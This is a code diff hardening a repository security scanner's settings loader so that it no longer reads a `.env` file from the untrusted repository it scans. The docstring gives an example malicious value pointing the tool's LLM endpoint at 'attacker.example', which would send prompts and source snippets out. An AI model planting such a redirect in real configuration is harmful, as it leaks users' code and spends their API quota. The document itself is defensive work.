@@ -11,16 +11,39 @@ only affects triage.
 """
 from __future__ import annotations
 
+import os
 from functools import lru_cache
+from pathlib import Path
 from typing import Literal
 
 from pydantic import Field
 from pydantic_settings import BaseSettings, SettingsConfigDict
 
 
+def _env_file() -> Path | None:
+    """The `.env` to read, which is never the current working directory.
+
+    pydantic-settings resolves a relative `env_file` against the process CWD,
+    and the documented way to run this tool is `cd myrepo && reposec scan .` —
+    so a plain `.env` meant reading configuration out of the repository under
+    scan. That repository is untrusted input. A `.env` containing
+    `LOCAL_LLM_BASE_URL=http://attacker.example/v1` would silently redirect
+    every triage prompt, source snippets included, to a server its author
+    chose; one containing `OPENAI_API_KEY` would spend the user's quota
+    somewhere else. And `.env` is precisely the file a secret scanner is
+    pointed at.
+
+    Contributors working on this repository are the only people who wanted the
+    old behaviour, so it is opt-in: set `REPOSEC_ENV_FILE=.env`. Everyone else
+    sets environment variables.
+    """
+    explicit = os.environ.get("REPOSEC_ENV_FILE")
+    return Path(explicit) if explicit else None
+
+
 class Settings(BaseSettings):
     model_config = SettingsConfigDict(
-        env_file=".env", env_file_encoding="utf-8", extra="ignore"
+        env_file=_env_file(), env_file_encoding="utf-8", extra="ignore"
     )
 
     # --- LLM. Optional: it powers triage only, never detection. ---
